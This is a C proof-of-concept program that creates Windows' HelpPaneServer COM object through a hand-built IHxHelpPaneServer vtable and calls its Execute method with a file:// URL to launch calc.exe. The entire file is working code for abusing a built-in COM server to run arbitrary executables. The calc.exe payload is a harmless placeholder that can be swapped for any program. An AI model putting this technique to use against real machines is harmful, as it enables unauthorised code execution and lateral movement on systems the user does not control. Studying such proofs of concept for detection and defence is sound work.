#include <windows.h>
#include <stdio.h>

// --- GUID definitions ---
// CLSID_HelpPaneServer: {8CEC58AE-07A1-11D9-B15E-000D56BFE6EE}
static const GUID CLSID_HelpPaneServer = {
    0x8cec58ae, 0x07a1, 0x11d9,
    {0xb1, 0x5e, 0x00, 0x0d, 0x56, 0xbf, 0xe6, 0xee}
};

// IID_IHxHelpPaneServer: {8CEC592C-07A1-11D9-B15E-000D56BFE6EE}
static const GUID IID_IHxHelpPaneServer = {
    0x8cec592c, 0x07a1, 0x11d9,
    {0xb1, 0x5e, 0x00, 0x0d, 0x56, 0xbf, 0xe6, 0xee}
};

// --- IHxHelpPaneServer interface (vtable layout) ---
typedef struct IHxHelpPaneServer IHxHelpPaneServer;

typedef struct {
    // IUnknown
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IHxHelpPaneServer* This, const GUID* riid, void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef)(IHxHelpPaneServer* This);
    ULONG(STDMETHODCALLTYPE* Release)(IHxHelpPaneServer* This);

    // IHxHelpPaneServer methods
    HRESULT(STDMETHODCALLTYPE* DisplayTask)(IHxHelpPaneServer* This, BSTR bstrUrl);
    HRESULT(STDMETHODCALLTYPE* DisplayContents)(IHxHelpPaneServer* This, BSTR bstrUrl);
    HRESULT(STDMETHODCALLTYPE* DisplaySearchResults)(IHxHelpPaneServer* This, BSTR bstrSearchQuery);
    HRESULT(STDMETHODCALLTYPE* Execute)(IHxHelpPaneServer* This, LPWSTR pcUrl);
} IHxHelpPaneServerVtbl;

struct IHxHelpPaneServer {
    IHxHelpPaneServerVtbl* lpVtbl;
};

int main() {
    HRESULT hr;
    IHxHelpPaneServer* pHelp = NULL;

    // Initialize COM
    hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        printf("CoInitialize failed: 0x%08lX\n", hr);
        return 1;
    }

    // Create the HelpPaneServer COM object using the native interface
    // Use CLSCTX_LOCAL_SERVER because HelpPane runs as a separate process
    hr = CoCreateInstance(
        &CLSID_HelpPaneServer,
        NULL,
        CLSCTX_LOCAL_SERVER,
        &IID_IHxHelpPaneServer,
        (void**)&pHelp
    );

    if (FAILED(hr)) {
        printf("CoCreateInstance failed: 0x%08lX\n", hr);
        CoUninitialize();
        return 1;
    }

    printf("IHxHelpPaneServer created successfully.\n");

    // Execute calc.exe – the method expects a file:// URL
    LPWSTR pcUrl = L"file:///C:/Windows/System32/calc.exe";
    hr = pHelp->lpVtbl->Execute(pHelp, pcUrl);

    if (SUCCEEDED(hr)) {
        printf("Execute succeeded. calc.exe should be running.\n");
    }
    else {
        printf("Execute failed: 0x%08lX\n", hr);
    }

    // Cleanup
    pHelp->lpVtbl->Release(pHelp);
    CoUninitialize();

    return 0;
}